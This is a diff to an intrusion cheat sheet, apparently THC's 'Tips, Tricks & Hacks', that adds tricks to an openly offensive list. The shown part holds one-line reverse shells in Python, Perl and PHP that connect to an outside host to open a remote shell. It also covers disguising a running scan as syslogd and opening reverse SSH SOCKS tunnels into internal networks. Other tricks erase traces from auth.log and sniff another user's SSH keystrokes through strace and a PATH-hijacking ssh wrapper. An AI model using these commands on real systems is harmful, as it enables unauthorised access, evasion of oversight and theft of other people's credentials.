@@ -1,5 +1,7 @@
 # THC's favourite Tips, Tricks & Hacks (Cheat Sheet)
 
+## Available at [https://tiny.cc/thctricks](https://tiny.cc/thctricks)
+
 A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.
 
 We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.
@@ -14,6 +16,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
    1. [Almost invisible SSH](#ais-anchor)
    1. [SSH tunnel OUT](#sto-anchor)
    1. [SSH tunnel IN](#sti-anchor)
+   1. [SSH socks5 IN](#ssi-anchor)
 3. [Network](#network-anchor)
    1. [ARP discover computers on the local network](#adln-anchor)
    1. [Monitor all new TCP connections](#mtc-anchor)
@@ -22,6 +25,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
    1. [uuencode](#feu-anchor)
    1. [openssl](#feo-anchor)
    1. [xxd](#fex-anchor)
+   1. [Multiple binaries](#feb-anchor)
    1. [File transfer using screen from REMOTE to LOCAL](#ftsrl-anchor)
    1. [File transfer using screen from LOCAL to REMOTE](#ftslr-anchor)
 5. [Reverse Shell / Dumb Shell](#rs-anchor)
@@ -30,6 +34,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
       1. [without Bash](#rswob-anchor)
       1. [with Python](#rswpy-anchor)
       1. [with Perl](#rswpl-anchor)
+      1. [with PHP](#rswphp-anchor)
    1. [Upgrading the dumb shell](#rsu-anchor)
       1. [Upgrade a reverse shell to a pty shell](#rsup-anchor)
       1. [Upgrade a reverse shell to a fully interactive shell](#rsup2-anchor)
@@ -73,6 +78,11 @@ $  id
 **1.ii. Hide your command**
 
 ```
+$ exec -a syslogd nmap -T0 10.0.2.1/24
+```
+
+Alternative if there is no Bash:
+```
 $ cp `which nmap` syslogd
 $ PATH=.:$PATH syslogd -T0 10.0.2.1/24
 ```
@@ -108,6 +118,17 @@ We use this to give access to a friend to an internal machine that is not on the
 $ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@host.org
 ```
 Anyone connecting to host.org:31338 will get connected to the compuyter 192.168.0.5 on port 80 via your computer.
+
+<a id="ssi-anchor"></a>
+**2.iv SSH socks4/5 IN**
+
+OpenSSH 7.6 adds support for reverse dynamic forwarding. In this mode *ssh* will act as a SOCKS4/5 proxy and forward connections to the destinations requested by the remote SOCKS client.
+
+In this example anyone configuring host.org:1080 as their SOCKS4/5 proxy can connect to any internal computers on any port that are accessible to the system where *ssh* was executed:
+
+```
+$ ssh -R 1080 user@host.org
+```
 
 ---
 <a id="network-anchor"></a>
@@ -146,7 +167,7 @@ Binary files transfer badly over a terminal connection. There are many ways to c
 
 Encode:
 ```
-$ uuencode /etc/issue.net issuer.net-COPY
+$ uuencode /etc/issue.net issue.net-COPY
 begin 644 issue-net-COPY
 356)U;G1U(#$X+C`T+C(@3%13"@``
 `
@@ -193,9 +214,30 @@ Decode:
 ```
 $ xxd -p -r >issue.net-COPY
 ```
+<a id="feb-anchor"></a>
+**4.iv. File Encoding - Multiple Binaries**
+
+Method 1: Using *shar* to create a self extracting shell script with binaries inside:
+```
+$ shar *.png *.c >stuff.shar
+```
+Transfer *stuff.shar* to the remote system and execute it:
+```
+$ chmod 700 stuff.shar
+$ ./stuff.shar
+```
+
+Method 2: Using *tar*
+```
+$ tar cfz - *.png *.c | openssl base64 >stuff.tgz.b64
+```
+Transfer *stuff.tgz.b64* to the remote system and execute:
+```
+$ openssl base64 -d | tar xfz -
+```
 
 <a id="ftsrl-anchor"></a>
-**4.iv. File transfer - using *screen* from REMOTE to LOCAL**
+**4.v. File transfer - using *screen* from REMOTE to LOCAL**
 
 Transfer a file FROM the remote system to your local system:
 
@@ -222,7 +264,7 @@ $ rm -rf screen-xfer.txt
 ```
 
 <a id="ftslr-anchor"></a>
-**4.v. File transfer - using *screen* from LOCAL to REMOTE**
+**4.vi. File transfer - using *screen* from LOCAL to REMOTE**
 
 On your local system (from within a different shell) encode the data:
 ```
@@ -306,6 +348,12 @@ $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.S
 $ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 # method 2
 $ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+```
+<a id="rswphp-anchor"></a>
+**5.i.e. Reverse shell with PHP**
+
+```
+php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
 ```
 
 <a id="rsu-anchor"></a>
@@ -391,6 +439,7 @@ This will reset the logfile to 0 without having to restart syslogd etc:
 
 This will remove any sign of us from the log file:
 ```
+# cd /dev/shm
 # grep -v 'thc\.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log
 ```
 
@@ -446,8 +495,7 @@ Store data in `/mnt/crypted`, then unmount:
 <a id="sss-anchor"></a>
 **8.i. Sniff a user's SSH session**
 ```
-$ strace -p <PID of ssh> -e trace=read -o ~/.ssh/ssh_log.txt
-$ grep 'read(4' ~/.ssh/ssh_log.txt | cut -f1 -d\"
+$ strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
 ```
 Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.
 
@@ -458,11 +506,10 @@ Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strac
 
 Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
 ```
-# Add ~/.ssh to the execution PATH variable so our 'ssh' is executed instead of the real ssh:
+# Add a local path to the PATH variable so our 'ssh' is executed instead of the real ssh:
 $ echo '$PATH=~/.local/bin:$PATH' >>~/.profile
 
-# Create our log directory and our own ssh binary
-$ mkdir ~/.ssh/.logs
+# Create a log directory and our own ssh binary
 $ mkdir -p ~/.local/bin ~/.ssh/logs
 
 $ cat >~/.local/bin/ssh
